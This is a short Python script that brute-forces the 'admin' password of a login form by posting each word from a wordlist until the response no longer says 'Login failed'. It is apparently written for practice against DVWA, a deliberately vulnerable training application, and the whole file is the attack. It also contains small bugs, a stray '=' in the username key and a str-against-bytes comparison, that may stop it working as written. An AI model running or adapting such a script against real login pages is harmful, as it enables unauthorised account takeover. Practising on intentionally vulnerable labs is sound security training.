#!/usr/bin/env python
import requests

target = "http://<YOUR_IP>/dvwa/login.php"
data_list={"username=": "admin", "password": "", "Login": "submit"}
response = requests.post(target, data=data_list)
#print(response.content)

with open("<YOUR_PASSWORD_WORDLIST_PATH>", "r") as wordlist_file:
    for line in wordlist_file:
        word=line.strip()
        data_list["password"]=word
        response = requests.post(target, data=data_list)
        if "Login failed" not in response.content:
            print("[+] Got the password --> "+word)
            exit()


print ("[!] Reached end of line.")
